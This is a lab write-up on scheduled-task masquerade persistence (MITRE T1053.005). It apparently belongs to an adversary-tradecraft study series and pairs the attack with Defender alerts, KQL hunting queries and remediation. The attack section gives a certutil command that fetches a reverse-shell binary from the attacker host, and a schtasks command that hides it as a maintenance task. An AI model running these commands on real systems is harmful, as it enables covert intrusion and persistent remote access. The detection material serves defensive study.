# T1053.005 – Scheduled Task Masquerade for C2 Persistence

**MITRE ATT&CK Reference:** [T1053.005 – Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)

This scenario continues the attack chain from [T1562.001 – Disable or Modify Windows Defender](https://github.com/j-manli/adversary-tradecraft-study/blob/main/03_defense_evasion/disable_or_modify_tools/T1562.001_windows_defender_tamper.md), where an attacker with administrative access weakened host defenses by disabling Defender and adding AV exclusions.

With protections suppressed, the attacker regains persistence by staging their C2 payload via native Windows binary, `certutil` , then configuring a scheduled task that launches it automatically. 
The task is disguised to look like a legitimate Windows maintenance process to both the trained and untrained eye.

---

## Host Configuration

- **Attacker VM:** `HR-COMPLAINTS` (Sliver C2 on Ubuntu 22.04)
  - **IP:** `10.1.0.51`

- **Target VM:** `CEO-LAPTOP` (Windows 10 with Microsoft Defender for Endpoint)
  - **IP:** `10.1.0.69`
  - **Admin Username:** `TrustMeBro`

---

## Execution

With Windows Defender disabled and a folder exclusion added, the attacker proceeds to maintain persistent access.

### 1. Stage Payload Using `certutil`

The attacker hosts a reverse shell binary (`win_maintenance_service.exe`) on their Sliver server and uses `certutil` to download it into the AV exclusion path:

    certutil -urlcache -f http://10.1.0.51/win_maintenance_service.exe C:\ProgramData\Microsoft\Windows\win_maintenance_service.exe  
&nbsp;

---

### 2. Create a Masqueraded Scheduled Task

The attacker sets up a scheduled task named `Windows Maintenance Task` to auto-run the payload at user logon:

    schtasks /Create /SC ONLOGON /TN "Windows Maintenance Task" /TR "C:\ProgramData\Microsoft\Windows\win_maintenance_service.exe" /RL HIGHEST /F

This blends in with legitimate task naming patterns while granting high privileges.

---

### 3. Triggering the Payload

The attacker logs out and back in as `TrustMeBro`, triggering the task and regaining a Sliver session.

## Detection & Hunt

Although no alert was triggered when the scheduled task executed, Microsoft Defender for Endpoint provided all the clues needed to piece things together.

### Device Timeline Analysis

In the timeline, several key events stood out:

- **Use of Certutil for Payload Delivery**

  Defender flagged `certutil` as a **Living-off-the-Land Binary (LOLBIN)** used to download malicious content.  

  This triggered an alert:  
  **"Use of living-off-the-land binary to run malicious code"**, with a full process tree showing `certutil.exe` staging the payload in the AV exclusion path.

- **Masqueraded Task Execution**  

  Later, a separate alert identified the scheduled task as a masquerade attempt:  
  **"Masqueraded task or service"** — a strong behavioral signal tied to abuse of generic or official-sounding names.

  <img width="1683" height="167" alt="alert_for_masqueraded_task_or_service" src="https://github.com/user-attachments/assets/8b5f1549-eed5-4a8a-b155-6d6fea83209f" />


- **Outbound C2 Activity**  

  Timeline telemetry also confirmed:  
  `services.exe` → `svchost.exe` → `win_maintenance_service.exe`  
  with an outbound connection over port 443 to the attacker’s IP: `10.1.0.51`.

  <img width="340" height="356.5" alt="outbound_remote_connection_device_timeline" src="https://github.com/user-attachments/assets/f9de618f-8724-44b8-91cb-46f04b536c0c" />


These artifacts — when observed together — paint a full narrative of staging, persistence, and C2, even in the absence of immediate detection.

### KQL: Scheduled Task Hunting

Look for tasks created outside normal system behavior:

    DeviceEvents
    | where ActionType == "ScheduledTaskCreated"
    | where InitiatingProcessFileName !in~ ("services.exe", "taskhostw.exe")
    | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine

> **Why it matters:** Most scheduled tasks are created by system processes. When tasks are recently created or modified, it's worth looking into.

<img width="1221" height="627" alt="search_for_task_creation_kql" src="https://github.com/user-attachments/assets/df761e01-e11e-4dfb-95d1-505162e4684e" />


For additional fidelity, filter for binaries outside trusted system paths:

    | where FolderPath !startswith "C:\\Windows\\System32"

> **Note:** Tasks commonly execute binaries in `C:\Windows\System32`. But depending on the task, they may not. It's still worth checking and validating unique paths.

### KQL: Suspicious Network Connections

Even if alerts don’t fire, analyzing network traffic can paint a clearer picture. Pivoting off of the binary name we learned about from the alerts:

    DeviceNetworkEvents
    | where InitiatingProcessFileName =~ "win_maintenance_service.exe"
    | project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort

  <img width="1030" height="586" alt="network_connection_mde_kql" src="https://github.com/user-attachments/assets/14a09bac-e907-4af0-843c-03aba7d97378" />

This confirmed what we found looking at the Device Timeline. A secure connection (over HTTPS) to the attacker's server.

## Remediation

### Scheduled Task Removal

**Step 1:**  
Delete the task via CLI:  
```cmd
schtasks /Delete /TN "Windows Maintenance Task" /F
```

**Step 2:**  
Delete the task file (if needed):  
```plaintext
C:\Windows\System32\Tasks\Windows Maintenance Task
```

**Step 3:**  
Reboot to fully clear persistence.

---

### Defender Restoration

**Re-enable real-time protection:**  
```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

**Remove attacker exclusions:**  
```powershell
Remove-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Windows"
```

**Validate Defender status:**  
```powershell
Get-MpComputerStatus | Select RealTimeProtectionEnabled
```

### Additional Review

- Search for tasks with **offending names or paths** using log auditing and KQL.
- Watch for use of uncommon [LOLBAS](https://lolbas-project.github.io/) techniques as documented in the LOLBAS project.
